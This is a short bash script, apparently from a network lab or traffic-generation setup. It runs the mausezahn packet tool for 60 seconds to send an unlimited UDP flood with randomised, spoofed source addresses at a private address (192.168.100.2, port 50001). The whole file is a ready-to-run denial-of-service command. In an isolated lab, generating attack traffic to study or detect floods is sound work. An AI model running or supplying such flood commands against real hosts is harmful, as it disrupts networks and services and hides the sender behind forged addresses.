#!/bin/bash

# Mausezahn UDP Flood (0 bytes) (60 seconds)
sudo timeout -s INT 60 mausezahn enp0s3 -A rand -B 192.168.100.2 -t udp dp=50001 -c 0